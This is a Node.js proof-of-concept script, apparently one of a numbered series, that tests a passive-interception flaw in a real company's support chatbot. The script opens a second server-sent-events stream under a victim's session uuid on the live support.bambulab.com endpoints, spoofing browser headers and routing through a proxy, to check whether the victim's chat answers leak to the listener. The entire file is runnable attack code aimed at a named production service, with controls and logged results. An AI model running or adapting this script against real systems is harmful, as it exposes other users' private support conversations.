// 31 - Passive interception of a victim-initiated chat turn.
//
// Question: does an attacker who only opens an SSE stream (never sends a
// chat POST) receive the answer to a question the victim sends?
//
// Roles:
//   victim   - opens its own SSEClient and sends the chat POST
//   attacker - opens a second SSE stream with the victim's uuid, sends nothing
//   control  - opens an SSE stream with a different uuid, sends nothing
//
// Success: the marker appears on the attacker stream while the victim stream
// receives nothing, and the control stream receives nothing.
//
// Run: node run.js
// Optional: $env:TRIALS=3; $env:BAMBU_BASE=https://support.bambulab.cn

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { ProxyAgent, fetch } = require('undici');

const BASE = process.env.BAMBU_BASE || 'https://support.bambulab.com';
const REGION = (process.env.REGION || (BASE.includes('.cn') ? 'CN' : 'EN')).toUpperCase();
const TRIALS = parseInt(process.env.TRIALS || '3', 10);
const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || 'http://127.0.0.1:7890';
const dispatcher = new ProxyAgent(proxy);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function headers(uuid) {
  return {
    'content-type': 'application/json',
    origin: BASE,
    referer: BASE + '/liveChat',
    'user-agent': UA,
    'x-robot-user': uuid,
    'x-bbl-official-site-region': REGION,
  };
}

function openStream(uuid, label) {
  const ctl = new AbortController();
  let out = '';
  let buf = '';
  let events = 0;
  const ready = fetch(BASE + '/gw/robot/sse/connect', {
    headers: {
      ...headers(uuid),
      accept: 'text/event-stream',
      'cache-control': 'no-cache',
      pragma: 'no-cache',
      'x-accel-buffering': 'no',
    },
    dispatcher,
    signal: ctl.signal,
  }).then(async (res) => {
    if (!res.ok) throw new Error('SSE ' + res.status);
    const reader = res.body.getReader();
    const dec = new TextDecoder();
    (async () => {
      try {
        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          if (!value) continue;
          buf += dec.decode(value, { stream: true });
          const parts = buf.split(/\r?\n\r?\n/);
          buf = parts.pop();
          for (const part of parts) {
            for (const line of part.split(/\r?\n|\r/)) {
              if (!line.startsWith('data:')) continue;
              const x = line.slice(5).replace(/^ /, '');
              if (x === '[DONE]') continue;
              try {
                const j = JSON.parse(x);
                events++;
                if (j.delta) out += String(j.delta).replace(/<br\s*\/?>/gi, '\n');
              } catch {}
            }
          }
        }
      } catch {}
    })();
  }).catch((e) => {
    console.log(label, 'stream error:', e.message);
  });
  return {
    label,
    ready,
    ctl,
    events: () => events,
    get output() { return out; },
  };
}

async function victimSend(uuid, marker) {
  const body = {
    requestId: 'clientID_text_' + crypto.randomUUID(),
    history: [],
    chatbot: [],
    origin: 1,
    cacheFlag: false,
    input: `Reply with exactly ${marker} and nothing else.`,
    machineModel: '',
    sessionId: uuid,
    uuid,
  };
  try {
    const res = await fetch(BASE + '/gw/robot/sse/chat', {
      method: 'POST',
      headers: headers(uuid),
      body: JSON.stringify(body),
      dispatcher,
      signal: AbortSignal.timeout(30000),
    });
    return { status: res.status, text: (await res.text()).slice(0, 160) };
  } catch (e) {
    return { error: e.name + ': ' + e.message };
  }
}

async function waitFor(streams, marker, timeoutMs = 35000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (streams.some((s) => s.output.includes(marker))) break;
    await sleep(200);
  }
  return streams.map((s) => ({ label: s.label, gotMarker: s.output.includes(marker), events: s.events(), output: s.output.trim().slice(0, 160) }));
}

async function trial(n, withAttacker) {
  const uuid = crypto.randomUUID();
  const other = crypto.randomUUID();
  const marker = 'PASSIVE-' + crypto.randomUUID().slice(0, 8).toUpperCase();

  const victim = openStream(uuid, 'victim');
  await victim.ready;
  await sleep(250);

  const control = withAttacker ? openStream(other, 'controlOtherUuid') : null;
  const attacker = withAttacker ? openStream(uuid, 'attacker') : null;
  if (control) { await control.ready; await sleep(150); }
  if (attacker) { await attacker.ready; await sleep(250); }

  const sent = await victimSend(uuid, marker);
  const streams = withAttacker ? [victim, attacker, control] : [victim];
  const result = await waitFor(streams, marker);
  victim.ctl.abort();
  if (attacker) attacker.ctl.abort();
  if (control) control.ctl.abort();

  const by = Object.fromEntries(result.map((r) => [r.label, r]));
  const row = {
    trial: n,
    mode: withAttacker ? 'victim+passive-listener' : 'victim-only-control',
    marker,
    chatStatus: sent.status || sent.error,
    victimGot: !!by.victim?.gotMarker,
    attackerGot: !!by.attacker?.gotMarker,
    controlGot: !!by.controlOtherUuid?.gotMarker,
    victimOutput: by.victim?.output || '',
    attackerOutput: by.attacker?.output || '',
    controlOutput: by.controlOtherUuid?.output || '',
  };
  console.log(
    `trial ${n} (${row.mode}): chat=${row.chatStatus} victim=${row.victimGot} attacker=${row.attackerGot} control=${row.controlGot}`
  );
  return row;
}

(async () => {
  console.log('Passive interception test');
  console.log('base:', BASE);
  const results = {
    base: BASE,
    timestamp: new Date().toISOString(),
    hypothesis: 'An attacker SSE stream that sends no chat request receives the answer to a victim-initiated turn.',
    victimOnlyControl: [],
    passiveListener: [],
  };

  for (let i = 1; i <= TRIALS; i++) {
    results.victimOnlyControl.push(await trial(i, false));
    await sleep(1500);
  }
  for (let i = 1; i <= TRIALS; i++) {
    results.passiveListener.push(await trial(i, true));
    await sleep(1500);
  }

  results.summary = {
    victimOnlyControl: results.victimOnlyControl.filter((r) => r.victimGot).length + '/' + TRIALS,
    passiveVictimGot: results.passiveListener.filter((r) => r.victimGot).length + '/' + TRIALS,
    passiveAttackerGot: results.passiveListener.filter((r) => r.attackerGot).length + '/' + TRIALS,
    passiveControlGot: results.passiveListener.filter((r) => r.controlGot).length + '/' + TRIALS,
  };
  console.log('SUMMARY', JSON.stringify(results.summary));
  fs.writeFileSync(path.join(__dirname, 'results.json'), JSON.stringify(results, null, 2));
  process.exit(0);
})();
